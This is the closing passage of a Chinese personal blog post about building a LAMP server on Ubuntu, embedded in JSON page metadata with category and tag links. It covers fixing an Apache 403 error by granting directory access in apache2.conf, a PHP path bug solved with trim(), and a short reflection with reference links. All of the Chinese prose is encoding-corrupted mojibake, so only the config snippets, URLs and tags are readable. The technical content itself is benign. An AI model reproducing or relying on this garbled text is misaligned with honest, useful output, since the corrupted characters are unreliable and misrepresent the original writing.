æœï¼Œäºæ˜¯åœ¨ç½‘ä¸Šä¹±æœè§£å†³æ–¹æ¡ˆï¼Œæœ‰è®©æ”¹httpdçš„ï¼ˆhttpdè·ŸApacheæœ‰å•¥å…³ç³»ï¼‰ï¼Œæœ‰æ”¹aliasé…ç½®çš„ï¼ˆæˆ‘çš„aliasé…ç½®çš„æ²¡æœ‰é—®é¢˜å•Šï¼‰ï¼Œæœ€åçœ‹åˆ°äº†ä¸€ä¸ªæ–¹æ¡ˆï¼ŒæŸ¥çœ‹apache2.confçš„ç›®å½•æƒé™é…ç½®ã€‚ä¿®æ”¹/etc/apache2/apache2.confæ–‡ä»¶ï¼Œå‘ç°ä»¥ä¸‹è®¾ç½®ï¼š12345678910111213141516&lt;Directory /&gt; Options FollowSymLinks AllowOverride None Require all denied&lt;/Directory&gt;&lt;Directory /usr/share&gt; AllowOverride None Require all granted&lt;/Directory&gt;&lt;Directory /var/www/&gt; Options Indexes FollowSymLinks AllowOverride None Require all granted&lt;/Directory&gt;å› ä¸ºApacheçš„é»˜è®¤é…ç½®æ˜¯ä¸èƒ½è®¿é—®/çš„ï¼Œæ‰€ä»¥æˆ‘æ²¡æœ‰å¯¹~/websitesçš„è®¿é—®æƒé™ï¼ˆè¿™é‡Œé€»è¾‘å¥½æ··ä¹±ï¼‰ã€‚æ·»åŠ é…ç½®ï¼š12345&lt;Directory /home/stdio/websites&gt; Options FollowSymLinks AllowOverride None Require all granted&lt;/Directory&gt;é‡å¯ApacheæœåŠ¡ï¼Œhttp://localhost/webç›®å½•ä¸‹çš„æ–‡ä»¶å‡å¯æ­£å¸¸è®¿é—®ã€‚ 4. ä¹±æå»å¹´å¼€å­¦çš„æ—¶å€™ç”¨phpå†™è¿‡ä¸€ä¸ªå°çš„æ–‡ä»¶æµè§ˆå™¨ï¼ˆå°±åƒApacheè‡ªå¸¦çš„æ–‡ä»¶æœåŠ¡å™¨é‚£æ ·çš„ï¼‰ï¼Œé—²å¾—æ— èŠæƒ³æŠŠå®ƒéƒ¨ç½²åˆ°è‡ªå·±åˆšæ­å¥½çš„æœåŠ¡å™¨ä¸Šï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ­£å¸¸è¿è¡Œï¼Œäºæ˜¯å°±æŠŠæ–‡ä»¶ä¼ åˆ°æœåŠ¡å™¨ä¸Šè®¿é—®ï¼Œä¸å‡ºæ„å¤–ï¼Œå¤±è´¥äº†ã€‚ç„¶åå°±æ‰¾å‘€æ‰¾å‘€æ‰¾bugï¼Œæ‰¾åˆ°ä¸€ä¸ªå°bugï¼ˆè¯·è‡ªåŠ¨è„‘è¡¥èƒŒæ™¯éŸ³ä¹ï¼‰ï¼Œæ‰¾äº†åŠä¸ªç‚¹æœ€åå‘ç°ï¼Œåœ¨ä»é…ç½®æ–‡æ¡£è¯»å–æ ¹ç›®å½•è·¯å¾„çš„æ—¶å€™ï¼Œä¼šåœ¨ç›®å½•ç»“å°¾åŠ ä¸€ä¸ªç©ºæ ¼ï¼ˆç°åœ¨æƒ³èµ·æ¥è§‰å¾—åº”è¯¥æ˜¯^Mï¼‰å¯¼è‡´è·¯å¾„æ‹¼æ¥æ—¶å‡ºé”™ï¼Œäºæ˜¯åœ¨$rootpathå‰é¢åŠ äº†trimï¼Œç„¶åå°±å¥½äº†â€¦æˆ‘çœŸæ˜¯èƒ½ä½œ_(:Ğ·ã‚âˆ )_ 5. æ€»ç»“è‡ªå·±åŠ¨æ‰‹æ­å»ºLAMPç¯å¢ƒè¿˜æ˜¯ä¸€ä»¶æŒºæœ‰æ„æ€çš„äº‹æƒ…ï¼Œé‡åˆ°é—®é¢˜è‡ªå·±å»æ‰¾ç­”æ¡ˆè‡ªå·±è§£å†³ï¼Œæœ€åæ‰€æœ‰çš„æœåŠ¡å…¨éƒ½æ­£å¸¸è¿è¡Œæ—¶è¿˜æ˜¯æœ‰ä¸€ç‚¹ç‚¹æˆå°±æ„Ÿçš„~åŠå¹´æ²¡ç¢°PHPï¼Œä¸€å…±å°±å†™äº†ä¸åˆ°10è¡Œä»£ç ï¼Œè¿˜å†™é”™äº†ä¸€åŠï¼Œæ¯”å¦‚æŠŠphpinfo()å†™æˆphp_infoï¼Œå¿˜äº†åœ¨&lt;?åé¢åŠ phpç¥é©¬çš„â€¦ï¼ˆæˆ‘è®°å¾—ä»¥å‰è°è·Ÿæˆ‘è¯´&lt;?åé¢å¯ä»¥ä¸åŠ phpçš„å•Šï¼‰ä¸€ç¯‡æ–‡ç« å†™äº†ä¸€æ™šä¸Šã€‚å¥½ä¹…æ²¡å†™è¿‡åšæ–‡äº†ï¼Œå†™è¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯æŠŠè‡ªå·±çš„ç»éªŒè®°ä¸‹æ¥ï¼Œå¦‚æœè¿™ç¯‡æ–‡ç« å¯ä»¥å¸®åˆ°è°çš„è¯ï¼Œé‚£å½“ç„¶æ›´å¥½~LinuxæŒºå¥½ç©çš„ï¼Œæ¯”è½¯ä»¶æµ‹è¯•å¥½ç©å¤šäº†ï¼ï¼ˆæœç„¶åˆ°äº†æœ€åè¿˜æ˜¯è¦é»‘ä¸€æŠŠæµ‹è¯•ï¼‰ 6. å‚è€ƒæ–‡æ¡£ubuntuä¸‹æ­å»ºLAMPPHP Mcrypt Installing/ConfiguringapacheæœåŠ¡å‡ºç°Forbidden 403é—®é¢˜çš„è§£å†³æ–¹æ³•æ€»ç»“ERROR 1045 (28000): Access denied for user â€˜rootâ€™@â€˜localhostâ€™ (using password: NO)","categories":[{"name":"ç½‘ç»œ","slug":"ç½‘ç»œ","permalink":"https://blog.stdioa.com/categories/ç½‘ç»œ/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.stdioa.com/tags/MySQL/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.stdioa.com/tags/Linux/"},{"name":"Apache","slug":"Apache","permalink":"https://blog.stdioa.com/tags/Apache/"},{"name":"PHP","slug":"PHP","permalink":"https://blog.stdioa.com/tags/PHP/"}]}]}